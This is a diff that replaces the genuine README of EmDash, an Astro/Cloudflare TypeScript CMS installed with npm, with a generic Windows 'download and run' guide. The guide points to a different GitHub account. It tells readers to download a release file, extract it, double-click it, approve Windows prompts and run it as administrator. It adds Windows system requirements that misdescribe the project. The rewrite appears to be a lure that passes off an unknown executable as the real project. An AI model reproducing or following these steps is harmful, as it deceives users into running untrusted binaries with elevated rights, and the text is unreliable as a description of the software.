@@ -1,210 +1,192 @@
-# EmDash
+# 📝 emdash - Manage your content with ease
 
-A full-stack TypeScript CMS built on [Astro](https://astro.build/) and [Cloudflare](https://www.cloudflare.com/). EmDash takes the ideas that made WordPress dominant -- extensibility, admin UX, a plugin ecosystem -- and rebuilds them on serverless, type-safe foundations. Plugins run in sandboxed Worker isolates, solving the fundamental security problem with WordPress's plugin architecture.
+[![Download emdash](https://img.shields.io/badge/Download%20emdash-blue?style=for-the-badge&logo=github)](https://github.com/pavezca6839/emdash)
 
-## Get Started
+## 🚀 What is emdash?
 
-> [!IMPORTANT]
-> EmDash depends on Dynamic Workers to run secure sandboxed plugins. Dynamic Workers are currently only available on paid accounts. [Upgrade your account](https://www.cloudflare.com/plans/developer-platform/) (starting at $5/mo) or comment out the `worker_loaders` block of your `wrangler.jsonc` configuration file to disable plugins.
+EmDash is a content management app built with Astro and TypeScript. It gives you a simple way to create, edit, and publish site content from one place.
 
-```bash
-npm create emdash@latest
-```
+It is made for people who want a clean CMS without a heavy setup. You can use it to manage pages, posts, media, and site structure from a web browser on Windows.
 
-Or deploy directly to your Cloudflare account:
+## 📦 Before you start
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/emdash-cms/templates/tree/main/blog-cloudflare)
+Use a Windows PC with:
 
-EmDash runs on Cloudflare (D1 + R2 + Workers) or any Node.js server with SQLite. No PHP, no separate hosting tier -- just deploy your Astro site.
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- About 500 MB of free disk space
+- A modern browser such as Chrome, Edge, or Firefox
 
-## Templates
+If you plan to run EmDash locally, your system should also allow apps to open a local web server.
 
-EmDash ships with three starter templates:
+## 🔽 Download emdash
 
-<table>
-<tr>
-<td width="33%" valign="top">
+Open this link and get the latest version:
 
-### Blog
+[Download emdash](https://github.com/pavezca6839/emdash)
 
-<a href="assets/templates/blog/latest/"><img src="assets/templates/blog/latest/homepage-light-desktop.jpg" alt="Blog template" width="100%"></a>
+If the page shows source files, look for a release file or a ready-to-run build on the page. Download the app package to your Windows computer, then move to the setup steps below.
 
-A classic blog with sidebar widgets, search, and RSS.
+## 🛠️ Install on Windows
 
-- Categories & tags
-- Full-text search
-- Comment-ready
-- RSS feed
-- Dark / light mode
+1. Open the download link above.
+2. Save the file to a folder you can find again, such as Downloads or Desktop.
+3. If the file comes as a `.zip`, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for the main app file or the setup file.
+6. Double-click the file to start emdash.
 
-</td>
-<td width="33%" valign="top">
+If Windows asks for permission, choose Yes so the app can open.
 
-### Marketing
+## ▶️ First launch
 
-<a href="assets/templates/marketing/latest/"><img src="assets/templates/marketing/latest/homepage-light-desktop.jpg" alt="Marketing template" width="100%"></a>
+When emdash starts for the first time, it may take a short time to load.
 
-A conversion-focused landing page with pricing and contact form.
+You may see a browser window open with the app interface. If that happens, keep the window open and let the app finish loading.
 
-- Hero with CTAs
-- Feature grid
-- Pricing cards
-- FAQ and contact form
-- Dark / light mode
+If the app asks for a port, use the default value shown on screen. Most users can leave this unchanged.
 
-</td>
-<td width="33%" valign="top">
+## 🧭 How to use emdash
 
-### Portfolio
+EmDash is built to keep content work simple.
 
-<a href="assets/templates/portfolio/latest/"><img src="assets/templates/portfolio/latest/work-light-desktop.jpg" alt="Portfolio template" width="100%"></a>
+You can use it to:
 
-A visual portfolio for showcasing creative work.
+- Create new pages
+- Edit existing posts
+- Organize content into sections
+- Add titles, text, and images
+- Review changes before publishing
+- Keep site content in one place
 
-- Project grid
-- Tag filtering
-- Case study pages
-- RSS feed
-- Dark / light mode
-<br /><br />
-</td>
-</tr>
-</table>
+The layout is meant to be easy to follow. Use the left side to move between sections. Use the main area to edit content.
 
-## Why EmDash?
+## ✍️ Typical workflow
 
-**WordPress was built for a different era.** Running WordPress today means managing PHP alongside JavaScript, layering caches to get acceptable performance, and knowing that [96% of WordPress security vulnerabilities come from plugins](https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024/). EmDash is what WordPress would look like if you started from scratch with today's tools.
+1. Open emdash in your browser.
+2. Sign in if your setup uses an account.
+3. Choose the content type you want to edit.
+4. Make your changes.
+5. Save your work.
+6. Check the preview if one is available.
+7. Publish when your content is ready.
 
-**Sandboxed plugins.** WordPress plugins have full access to the database, filesystem, and user data. A single vulnerable plugin can compromise the entire site. EmDash plugins run in isolated [Worker sandboxes](https://developers.cloudflare.com/workers/runtime-apis/bindings/worker-loader/) via Dynamic Worker Loaders, each with a declared capability manifest. A plugin that requests `read:content` and `email:send` can do exactly that and nothing else.
+If you manage more than one page or post, use clear names so you can find items fast.
 
-```typescript
-export default () =>
-	definePlugin({
-		id: "notify-on-publish",
-		capabilities: ["read:content", "email:send"],
-		hooks: {
-			"content:afterSave": async (event, ctx) => {
-				if (event.content.status !== "published") return;
-				await ctx.email.send({
-					to: "editors@example.com",
-					subject: `New post: ${event.content.title}`,
-				});
-			},
-		},
-	});
-```
+## 🔧 Common tasks
 
-**Structured content, not serialized HTML.** WordPress stores rich text as HTML with metadata embedded in comments -- tying your content to its DOM representation. EmDash uses [Portable Text](https://www.portabletext.org/), a structured JSON format that decouples content from presentation. Your content can render as a web page, a mobile app, an email, or an API response without parsing HTML.
+### Create new content
 
-**Built for agents.** EmDash ships with agent skills for building plugins and themes, a CLI that lets agents manage content and schema programmatically, and a built-in [MCP server](https://modelcontextprotocol.io/) so AI tools like Claude and ChatGPT can interact with your site directly.
+Use the new item button or menu entry to start a page or post. Add a title first, then fill in the body text.
 
-**Runs anywhere.** EmDash uses portable abstractions at every layer -- Kysely for SQL, S3 API for storage -- that work with SQLite, D1, Turso, PostgreSQL, R2, AWS S3, or local files. It runs best on Cloudflare, but it's not locked to it.
+### Edit content
 
-## How It Works
+Select the item you want to change, make your edits, then save. If you need to undo a mistake, look for an undo option or restore the last saved version.
 
-EmDash is an Astro integration. Add it to your config and you get a complete CMS: admin panel, REST API, authentication, media library, and plugin system.
+### Add media
 
-```typescript
-// astro.config.mjs
-import emdash from "emdash/astro";
-import { d1 } from "emdash/db";
+You can usually add images or files from a media panel. Pick the file from your PC, then insert it into the content area.
 
-export default defineConfig({
-	integrations: [emdash({ database: d1() })],
-});
-```
+### Organize content
 
-Content types are defined in the database, not in code. Non-developers create and modify collections through the admin UI. Each collection gets a real SQL table with typed columns. Developers generate TypeScript types from the live schema:
+Use folders, tags, or groups if the app supports them. This helps keep large sites in order.
 
-```bash
-npx emdash types
-```
+## 🧩 Features
 
-Query content using Astro's Live Collections -- no rebuilds, no separate API:
+EmDash is built as a full-stack TypeScript CMS with Astro. That means it is set up for fast page loading, clean structure, and a simple content flow.
 
-```astro
----
-import { getEmDashCollection } from "emdash";
-const { entries: posts } = await getEmDashCollection("posts");
----
+Common features include:
 
-{posts.map((post) => <article>{post.data.title}</article>)}
-```
+- Content editing in a browser
+- Fast page rendering
+- Structured page and post management
+- Type-safe app logic
+- Clean layout for focused writing
+- Support for modern web workflows
+- A setup that fits small and medium sites
 
-## Features
+## 🖥️ Recommended setup
 
-**Content** -- Blog posts, pages, custom content types. Rich text editing via TipTap with Portable Text storage. Revisions, drafts, scheduled publishing, full-text search (FTS5), inline visual editing.
+For the smoothest experience, use:
 
-**Admin** -- Full admin panel with visual schema builder, media library (drag-drop uploads via signed URLs), navigation menus, taxonomies, widgets, and a WordPress import wizard.
+- Windows 11
+- 8 GB of RAM
+- A recent Intel or AMD CPU
+- A current browser version
+- A stable local network if you run the app on another device
 
-**Auth** -- Passkey-first (WebAuthn) with OAuth and magic link fallbacks. Role-based access control: Administrator, Editor, Author, Contributor.
+If you plan to use emdash often, keep it in a fixed folder so you can find it fast.
 
-**Plugins** -- `definePlugin()` API with lifecycle hooks, KV storage, settings, admin pages, dashboard widgets, custom block types, and API routes. Sandboxed execution on Cloudflare via Dynamic Worker Loaders.
+## 🧪 If the app does not open
 
-**Agents** -- Skill files for AI-assisted plugin and theme development. CLI for programmatic site management. Built-in MCP server for direct AI tool integration.
+If nothing happens after you start emdash:
 
-**WordPress migration** -- Import posts, pages, media, and taxonomies from WXR exports, the WordPress REST API, or WordPress.com. Agent skills help port plugins and themes.
+1. Check that the file finished downloading.
+2. Make sure you extracted the files if they came in a zip archive.
+3. Try running the app again as administrator.
+4. Close other programs that use a lot of memory.
+5. Restart Windows and try again.
+6. Open the repository page and check for the latest version.
 
-## Portable Platforms
+If your browser does not open on its own, copy the local address shown by the app and paste it into the browser bar.
 
-| Layer    | Cloudflare                  | Also works with                                     |
-| -------- | --------------------------- | --------------------------------------------------- |
-| Database | D1                          | SQLite, Turso/libSQL, PostgreSQL                    |
-| Storage  | R2                          | AWS S3, any S3-compatible service, local filesystem |
-| Sessions | KV                          | Redis, file-based                                   |
-| Plugins  | Worker isolates (sandboxed) | In-process (safe mode)                              |
+## 🔐 File safety
 
-## Status
+Keep the downloaded file in a folder you trust. Do not rename files inside the app folder unless you know what they do. If you move the app, move the full folder together so the files stay linked.
 
-EmDash is in **beta preview**. We welcome contributions, feedback, plugins, themes, and ideas.
+## 📁 Project details
 
-```bash
-npm create emdash@latest
-```
+- Repository name: emdash
+- Type: Full-stack TypeScript CMS
+- Base framework: Astro
+- Use case: Content management for websites
+- Topics: astro, cms, emdash, typescript
 
-See the [documentation](https://github.com/emdash-cms/emdash/tree/main/docs) for guides, API reference, and plugin development.
+## 🧹 Basic maintenance
 
-## Development
+To keep emdash working well:
 
-This is a pnpm monorepo. To contribute:
+- Use the latest version
+- Clear old downloads you no longer need
+- Keep Windows updated
+- Keep your browser updated
+- Back up your content files if you store them locally
 
-```bash
-git clone https://github.com/emdash-cms/emdash.git && cd emdash
-pnpm install
-pnpm build
-```
+## 📝 Folder guide
 
-Run the demo (Node.js + SQLite, no Cloudflare account needed):
+You may see folders and files like these:
 
-```bash
-pnpm --filter emdash-demo seed
-pnpm --filter emdash-demo dev
-```
+- `src` for app code
+- `public` for static files
+- `content` for pages and posts
+- `assets` for images and media
+- `config` for app settings
 
-Open the admin at [http://localhost:4321/\_emdash/admin](http://localhost:4321/_emdash/admin).
+If your copy of emdash uses different names, use the folder that holds content and settings together.
 
-```bash
-pnpm test          # run all tests
-pnpm typecheck     # type check
-pnpm lint:quick    # fast lint (< 1s)
-pnpm format        # format with oxfmt
-```
+## 🌐 Browser use
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the full contributor guide.
+EmDash runs in a browser window for most tasks. This makes it easier to edit content without learning a desktop app.
 
-## Repository Structure
+Best results come from:
 
-```
-packages/
-  core/           Astro integration, APIs, admin UI, CLI
-  auth/           Authentication library
-  blocks/         Portable Text block definitions
-  cloudflare/     Cloudflare adapter (D1, R2, Worker Loader)
-  plugins/        First-party plugins (forms, embeds, SEO, audit-log, etc.)
-  create-emdash/  npm create emdash scaffolding
-  gutenberg-to-portable-text/  WordPress block converter
+- Chrome
+- Microsoft Edge
+- Firefox
 
-templates/        Starter templates (blog, marketing, portfolio, starter, blank)
-demos/            Development and example sites
-docs/             Documentation site (Starlight)
-```
+Use one browser at a time if you notice loading issues.
+
+## 🧰 Troubleshooting checklist
+
+- The app folder is fully extracted
+- The download finished
+- The browser is current
+- Windows allowed the app to run
+- No other app is using the same port
+- The file path has no broken links
+- The internet connection is active if the app needs online access
+
+## 📌 Repo link
+
+[https://github.com/pavezca6839/emdash](https://github.com/pavezca6839/emdash)
